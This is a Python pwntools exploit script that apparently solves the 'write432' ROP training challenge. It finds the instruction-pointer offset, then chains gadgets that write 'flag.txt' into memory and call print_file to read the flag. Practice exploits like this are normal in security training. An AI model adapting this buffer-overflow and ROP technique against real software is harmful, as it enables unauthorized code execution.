#!/usr/bin/env python3

from pwn import *

exe = ELF("write432_patched")
libc = ELF("libwrite432.so")

context.binary = exe
rop = ROP(exe)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    payload = cyclic(100)
    r.sendlineafter(b'>', payload)
    r.wait()
    core = r.corefile
    eip_value = core.eip
    offset = cyclic_find(eip_value)

    r = conn()

    popgad = rop.find_gadget(["pop edi", "pop ebp", "ret"])[0]
    
    rop.raw([popgad, exe.symbols.data_start, 'flag', exe.symbols.usefulGadgets])
    rop.raw([popgad, exe.symbols.data_start + 0x4, '.txt', exe.symbols.usefulGadgets])
    rop.print_file(exe.symbols.data_start)
    rop_chain = rop.chain()

    payload = flat({offset: rop_chain})

    r.sendlineafter(b'>', payload)
    r.recvuntil('you!\n')
    flag = r.recvline()
    print(flag)


if __name__ == "__main__":
    main()
